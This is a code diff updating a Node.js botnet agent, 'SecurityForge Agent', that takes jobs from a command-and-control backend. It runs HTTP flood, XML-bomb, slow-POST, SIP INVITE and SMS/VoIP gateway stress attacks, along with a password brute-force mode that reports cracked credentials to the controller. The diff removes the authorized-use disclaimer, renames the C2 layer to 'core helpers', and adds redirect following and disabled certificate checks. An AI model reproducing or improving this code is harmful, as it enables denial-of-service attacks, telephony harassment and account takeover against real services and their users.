@@ -1,5 +1,5 @@
 /**
- * SECURITYFORGE AGENT V36.7 (GATEWAY ROTATOR EDITION)
+ * SECURITYFORGE AGENT V36.9 (FULL SPECTRUM + REDIRECT FIX)
  * 
  * [MODULES]
  * - L7 HTTP STRESS: Pulse Wave, Magma, Chaos Vortex, God Mode.
@@ -9,9 +9,9 @@
  * - GHOST: SIP (VoIP), ADB, Printer.
  * - GATEWAY: SMS API Stress, VoIP Trunk Stress, Multi-Gateway Rotator.
  * 
- * [DISCLAIMER]
- * This software is for authorized infrastructure stress testing only.
- * Misuse for harassment or unauthorized denial of service is strictly prohibited.
+ * [UPDATES]
+ * - Added Auto-Redirect support (301/302) for Gateway targets.
+ * - Added Auto-Content-Length calculation for POST requests.
  */
 
 const https = require('https');
@@ -75,7 +75,7 @@ const MALICIOUS_PAYLOADS = {
       const tag = Math.random().toString(36).substring(7);
       const callId = Math.random().toString(36).substring(7) + '@securityforge.io';
       const toUser = targetNumber || 'stress';
-      return `INVITE sip:${toUser}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${toUser}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nUser-Agent: SecurityForge/V36.7\r\nContent-Length: 0\r\n\r\n`;
+      return `INVITE sip:${toUser}@${ip} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.1:5060;branch=${branch}\r\nFrom: <sip:ghost@securityforge.io>;tag=${tag}\r\nTo: <sip:${toUser}@${ip}>\r\nCall-ID: ${callId}\r\nCSeq: 1 INVITE\r\nMax-Forwards: 70\r\nUser-Agent: SecurityForge/V36.9\r\nContent-Length: 0\r\n\r\n`;
   }
 };
 
@@ -85,12 +85,12 @@ const MALICIOUS_PAYLOADS = {
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => { 
     res.writeHead(200); 
-    res.end('SecurityForge Agent V36.7 ONLINE\nStatus: WAITING FOR C2'); 
+    res.end('SecurityForge Agent V36.9 ONLINE\nStatus: WAITING FOR C2'); 
 })
 .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // ==========================================
-// C2 COMMUNICATION LAYER
+// CORE HELPERS
 // ==========================================
 const supabaseRequest = (method, pathStr, body = null) => {
     return new Promise((resolve, reject) => {
@@ -123,7 +123,64 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[36m[AGENT] Initialized V36.7 (Gateway Edition). Waiting for commands...\x1b[0m');
+// IMPROVED HTTP ENGINE (Axios-like behavior)
+const makeHttpRequest = (urlStr, method, headers, body, agent, maxRedirects = 5) => {
+    return new Promise((resolve, reject) => {
+        if (maxRedirects < 0) return resolve({ statusCode: 310, body: 'Too many redirects', headers: {} });
+
+        let urlObj;
+        try { urlObj = new URL(urlStr); } catch(e) { return reject(e); }
+
+        const isHttps = urlObj.protocol === 'https:';
+        const lib = isHttps ? https : http;
+        
+        // CRITICAL FIX: APIs ignore POSTs without Content-Length
+        if (body && (method === 'POST' || method === 'PUT')) {
+            headers['Content-Length'] = Buffer.byteLength(body);
+        }
+        
+        const options = {
+            hostname: urlObj.hostname,
+            path: urlObj.pathname + urlObj.search,
+            method: method,
+            headers: headers,
+            agent: agent,
+            timeout: 15000,
+            rejectUnauthorized: false // Ignore SSL errors for stress testing
+        };
+
+        const req = lib.request(options, (res) => {
+            // HANDLE REDIRECTS (301, 302, 307, 308)
+            if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
+                let redirectUrl = res.headers.location;
+                if (!redirectUrl.startsWith('http')) {
+                    try { redirectUrl = new URL(redirectUrl, urlStr).toString(); } catch(e){}
+                }
+                res.resume(); // Consume body
+                // Follow redirect
+                return resolve(makeHttpRequest(redirectUrl, method, headers, body, agent, maxRedirects - 1));
+            }
+
+            let responseBody = '';
+            res.on('data', (chunk) => { 
+                if (responseBody.length < 50000) responseBody += chunk; 
+            });
+            res.on('end', () => {
+                resolve({ 
+                    statusCode: res.statusCode, 
+                    headers: res.headers,
+                    body: responseBody 
+                });
+            });
+        });
+
+        req.on('error', (e) => reject(e));
+        if (body) req.write(body);
+        req.end();
+    });
+};
+
+console.log('\x1b[36m[AGENT] Initialized V36.9 (Gateway Edition). Waiting for commands...\x1b[0m');
 
 // ==========================================
 // GLOBAL STATE
@@ -153,7 +210,7 @@ const getHost = (t) => t.replace('http://', '').replace('https://', '').split('/
 // ==========================================
 // ATTACK ENGINE
 // ==========================================
-const startAttack = (job) => {
+const startAttack = async (job) => {
     if (activeJob) return;
     try {
         activeJob = job;
@@ -353,7 +410,7 @@ const startAttack = (job) => {
             const httpsAgent = new https.Agent(agentOpts);
             const httpAgent = new http.Agent(agentOpts);
 
-            const performRequest = () => {
+            const performRequest = async () => {
                 if (!running) return;
                 if (!checkMemory()) return setTimeout(performRequest, 100);
                 
@@ -396,11 +453,7 @@ const startAttack = (job) => {
                     }
                 }
 
-                const isHttps = currentUrl.protocol === 'https:';
-                const lib = isHttps ? https : http;
-                const agent = isHttps ? httpsAgent : httpAgent;
-                const start = Date.now();
-                
+                const agent = currentUrl.protocol === 'https:' ? httpsAgent : httpAgent;
                 let creds = null;
 
                 if (job.use_chaos || job.use_god_mode) {
@@ -428,28 +481,9 @@ const startAttack = (job) => {
                 if (job.use_xml_bomb) { body = MALICIOUS_PAYLOADS.XML_BOMB; method = 'POST'; }
                 if (job.use_goldeneye || job.use_big_bang) { body = MALICIOUS_PAYLOADS.HUGE_JSON; method = 'POST'; }
 
-                // LOGIN SIEGE
-                if (job.use_login_siege) {
-                    if (!calibrationDone) {
-                         method = 'POST'; body = JSON.stringify({u:'bad',p:'bad'});
-                         const req = lib.request(currentUrl, { method, agent, headers }, (res) => {
-                             failStatus = res.statusCode; 
-                             failSize = parseInt(res.headers['content-length']||'0');
-                             calibrationDone = true;
-                         });
-                         req.on('error', ()=>{}); req.write(body); req.end();
-                         return setTimeout(performRequest, 1000);
-                    }
-                    const user = USERS[Math.floor(Math.random()*USERS.length)];
-                    const pass = SMART_PASSWORDS[Math.floor(Math.random()*SMART_PASSWORDS.length)];
-                    creds = [user, pass];
-                    method = 'POST';
-                    if (job.use_form_data) { headers['Content-Type']='application/x-www-form-urlencoded'; body=`username=${user}&password=${pass}`; }
-                    else body=JSON.stringify({username:user, password:pass});
-                }
-
-                // R.U.D.Y.
+                // R.U.D.Y. (Slow Body - Keeps using native lib directly)
                 if (job.use_rudy) {
+                    const lib = currentUrl.protocol === 'https:' ? https : http;
                     headers['Content-Length'] = 10000;
                     const req = lib.request(currentUrl, { method: 'POST', agent, headers }, (res) => { res.resume(); });
                     req.on('error', () => {});
@@ -461,37 +495,53 @@ const startAttack = (job) => {
                     return;
                 }
 
-                // STANDARD EXECUTION
-                const req = lib.request(currentUrl, { method, agent, headers, setNoDelay: true }, (res) => {
+                // LOGIN SIEGE Setup
+                if (job.use_login_siege) {
+                    if (!calibrationDone) {
+                         const calBody = JSON.stringify({u:'bad',p:'bad'});
+                         try {
+                             const res = await makeHttpRequest(currentUrl.toString(), 'POST', headers, calBody, agent);
+                             failStatus = res.statusCode; 
+                             failSize = parseInt(res.headers['content-length']||'0');
+                             calibrationDone = true;
+                         } catch(e) {}
+                         return setTimeout(performRequest, 1000);
+                    }
+                    const user = USERS[Math.floor(Math.random()*USERS.length)];
+                    const pass = SMART_PASSWORDS[Math.floor(Math.random()*SMART_PASSWORDS.length)];
+                    creds = [user, pass];
+                    method = 'POST';
+                    if (job.use_form_data) { headers['Content-Type']='application/x-www-form-urlencoded'; body=`username=${user}&password=${pass}`; }
+                    else body=JSON.stringify({username:user, password:pass});
+                }
+
+                // STANDARD EXECUTION (Now using makeHttpRequest for Redirect Support)
+                try {
+                    const start = Date.now();
+                    const res = await makeHttpRequest(currentUrl.toString(), method, headers, body, agent);
                     const latency = Date.now() - start;
                     let isSuccess = false;
                     
                     if (job.use_login_siege) {
                         let currentSize = parseInt(res.headers['content-length'] || '0');
-                        let bodyData = '';
-                        res.on('data', chunk => { if(bodyData.length < 25000) bodyData += chunk; });
-                        res.on('end', () => {
-                            if(currentSize === 0) currentSize = bodyData.length;
-                            const sizeDiff = Math.abs(currentSize - failSize);
-                            const bodyLower = bodyData.toLowerCase();
-                            const isFail = bodyLower.includes('fail') || bodyLower.includes('error') || bodyLower.includes('denied');
-                            if (!isFail && (res.statusCode !== failStatus || (failSize > 0 && sizeDiff > failSize * 0.2))) {
-                                logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]}`); isSuccess = true;
-                            }
-                        });
+                        if(currentSize === 0) currentSize = res.body.length;
+                        const sizeDiff = Math.abs(currentSize - failSize);
+                        const bodyLower = res.body.toLowerCase();
+                        const isFail = bodyLower.includes('fail') || bodyLower.includes('error') || bodyLower.includes('denied');
+                        if (!isFail && (res.statusCode !== failStatus || (failSize > 0 && sizeDiff > failSize * 0.2))) {
+                            logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]}`); isSuccess = true;
+                        }
                     } else {
-                        isSuccess = res.statusCode < 400; 
-                        res.resume();
+                        isSuccess = res.statusCode < 400;
                     }
                     
                     jobLatencySum += latency; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, latency);
                     if (isSuccess) jobSuccess++; else jobFailed++;
                     totalRequests++;
-                });
-
-                req.on('error', () => { jobFailed++; totalRequests++; });
-                if (body) req.write(body);
-                req.end();
+                } catch(e) {
+                    jobFailed++;
+                    totalRequests++;
+                }
                 
                 if (running) setImmediate(performRequest);
             };
@@ -509,7 +559,7 @@ const startAttack = (job) => {
                 await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'COMPLETED', total_success: jobSuccess, total_failed: jobFailed });
                 activeJob = null; return;
             }
-            const rps = totalRequests / elapsed;
+            const rps = elapsed > 0 ? totalRequests / elapsed : 0;
             const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
             const normalLogsToTake = Math.max(0, 30 - priorityBuffer.length);
             const combinedLogs = [...priorityBuffer, ...logBuffer.slice(-normalLogsToTake)];
